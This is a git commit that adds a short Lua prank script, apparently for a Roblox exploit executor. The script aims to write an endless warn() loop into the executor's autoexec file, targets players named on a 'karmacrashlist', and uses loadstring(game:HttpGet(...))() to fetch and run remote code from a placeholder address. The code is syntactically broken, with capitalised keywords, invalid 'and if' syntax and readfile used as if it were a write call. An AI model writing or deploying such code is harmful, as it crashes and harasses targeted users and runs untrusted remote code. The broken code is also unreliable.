fd1c441d4a9b77bca8d6c1cf3fe432750f797066
TedMcbur <142521760+Tedmcbur@users.noreply.github.com>
2023-08-25 10:29:34 -0400

    Create tedannoysyou.lua

---
+++ tedannoysyou.lua
@@ -0,0 +1,6 @@
+Local blacklisttextexists = readfile("/../autoexec/autoexec.lua", "while true do warn() end")
+readfile("/../autoexec/autoexec.lua", "while true do warn() end")
+If blacklisttextexists = false and if table.find(karmacrashlist, game.Players.LocalPlayer.Name) then --I didn't modify this code lmao,
+rconsoleprint("BAD DECISION!!") --mandela catalogue reference
+loadstring(game:HttpGet("tedplasteredonyourscreenlol"))()
+  
